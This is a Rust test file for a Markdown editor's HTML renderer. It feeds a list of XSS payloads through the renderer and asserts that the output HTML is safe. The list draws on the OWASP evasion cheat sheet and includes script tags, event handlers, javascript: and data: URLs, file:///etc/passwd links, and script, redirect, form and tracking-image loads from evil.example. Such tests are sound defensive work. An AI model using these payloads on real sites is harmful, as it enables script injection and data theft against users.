//! Known attack payloads must never produce unsafe HTML.

// Test code is expected to panic on failure.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

mod common;

use common::invariants::assert_safe_html;
use markdown_editor_core::render_html;

/// Payloads inspired by the OWASP XSS filter evasion cheat sheet and
/// Markdown-specific attacks. Every entry is rendered and checked against the
/// invariants; selected entries also have exact expectations below.
const PAYLOADS: &[&str] = &[
    // Raw HTML
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<object data=\"data:text/html,<script>alert(1)</script>\"></object>",
    "<embed src=\"javascript:alert(1)\">",
    "<style>body{background:url(//evil.example)}</style>",
    "<div style=\"background:url(javascript:alert(1))\">x</div>",
    "<a href=\"javascript:alert(1)\">x</a>",
    "<meta http-equiv=\"refresh\" content=\"0;url=//evil.example\">",
    "<base href=\"//evil.example/\">",
    "<link rel=stylesheet href=//evil.example/x.css>",
    "<form action=//evil.example><input name=x></form>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<!--><script>alert(1)</script>-->",
    "<scr<script>ipt>alert(1)</script>",
    // Markdown links
    "[x](javascript:alert(1))",
    "[x](JaVaScRiPt:alert(1))",
    "[x](java\tscript:alert(1))",
    "[x](&#106;avascript:alert(1))",
    "[x](&#x6A;avascript:alert(1))",
    "[x](vbscript:msgbox(1))",
    "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    "[x](file:///etc/passwd)",
    "[x](<javascript:alert(1)>)",
    "[x]: javascript:alert(1)\n\n[x]",
    "<javascript:alert(1)>",
    "[x](\"onmouseover=alert(1) x=\")",
    "[x](https://ok.example \"\\\"onmouseover=alert(1)\")",
    // Markdown images
    "![x](https://evil.example/track.png)",
    "![x](//evil.example/track.png)",
    "![x](/etc/passwd)",
    "![x](file:///etc/passwd)",
    "![x](data:image/svg+xml,<svg onload=alert(1)>)",
    "![x](javascript:alert(1))",
    "![x\"onerror=\"alert(1)](a.png)",
    "![x](<\\\\evil.example\\share\\a.png>)",
    "![x](a.png \"\\\" onerror=\\\"alert(1)\")",
    "[![x](https://evil.example/a.png)](https://ok.example)",
    "![x][ref]\n\n[ref]: https://evil.example/a.png",
    // Code blocks and info strings
    "```\"><script>alert(1)</script>\nx\n```",
    "```javascript:alert(1)\nx\n```",
    // Autolinks (GFM)
    "www.example.com/\"onmouseover=alert(1)",
    "javascript:alert(1)",
    // Task lists
    "- [x] <input type=text autofocus onfocus=alert(1)>",
];

#[test]
fn payloads_produce_safe_html() {
    for payload in PAYLOADS {
        let html = render_html(payload).expect("payload renders");
        assert_safe_html(&html, payload);
    }
}

#[test]
fn raw_html_is_shown_as_text() {
    let html = render_html("<script>alert(1)</script>").unwrap();
    assert_eq!(html, "&lt;script&gt;alert(1)&lt;/script&gt;\n");
}

#[test]
fn javascript_link_keeps_text_but_loses_target() {
    let html = render_html("[click](javascript:alert(1))").unwrap();
    // comrak replaces the unsafe URL with an empty one, i.e. a no-op link.
    assert_eq!(
        html,
        "<p><a href=\"\" rel=\"noopener noreferrer\">click</a></p>\n"
    );
}

#[test]
fn remote_image_loses_src_but_keeps_alt_text() {
    let html = render_html("![tracking pixel](https://evil.example/t.png)").unwrap();
    assert_eq!(html, "<p><img alt=\"tracking pixel\"></p>\n");
}

#[test]
fn local_image_keeps_src() {
    let html = render_html("![diagram](images/diagram.png)").unwrap();
    assert_eq!(
        html,
        "<p><img src=\"images/diagram.png\" alt=\"diagram\"></p>\n"
    );
}

#[test]
fn safe_links_are_kept() {
    let html =
        render_html("[a](https://example.com) [b](mailto:a@example.com) [c](other.md)").unwrap();
    assert_eq!(
        html,
        "<p><a href=\"https://example.com\" rel=\"noopener noreferrer\">a</a> \
         <a href=\"mailto:a@example.com\" rel=\"noopener noreferrer\">b</a> \
         <a href=\"other.md\" rel=\"noopener noreferrer\">c</a></p>\n"
    );
}

#[test]
fn unusual_code_language_is_dropped() {
    let html = render_html("```\"><b>\nx\n```").unwrap();
    assert_eq!(html, "<pre><code>x\n</code></pre>\n");
}
